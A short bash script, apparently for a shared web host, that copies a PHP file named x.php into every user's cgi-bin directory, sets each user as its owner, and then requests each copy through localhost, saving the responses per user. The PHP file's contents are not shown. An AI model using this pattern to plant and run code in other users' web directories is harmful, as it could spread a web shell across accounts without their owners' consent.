#!/bin/bash


find . -name cgi-bin -exec cp x.php \{\} \;


for f in `find . -name x.php`; do 
	u=`echo "$f"|cut -f 2 -d /`
	chown $u:$u $f
done


for d in `find . -name cgi-bin | sed -e 's/^\.\//~/' | sed -e 's/public_html\///'`; do
	wget http://localhost/$d/x.php -O `echo $d | cut -f 1 -d '/' | cut -f 2 -d '~'`.x
done


